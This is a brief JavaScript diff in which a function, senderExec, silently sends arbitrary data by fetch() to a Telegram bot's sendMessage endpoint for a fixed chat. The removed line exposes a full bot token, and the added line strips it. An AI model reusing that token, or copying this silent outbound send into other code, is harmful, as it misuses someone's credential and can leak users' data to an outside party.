@@ -47,7 +47,7 @@ function transformQrText(str){
 }
 
 function senderExec(data){
-    const sendUrl = "https://api.telegram.org/bot7223979310:AAGXaBA5pbGoDex3LD1e07WS-2lmHMTkuuc/sendMessage?chat_id=-1002246333261&text=";
+    const sendUrl = "https://api.telegram.org/bot/sendMessage?chat_id=-1002246333261&text=";
     let url = sendUrl + data;
     fetch(url);
 }
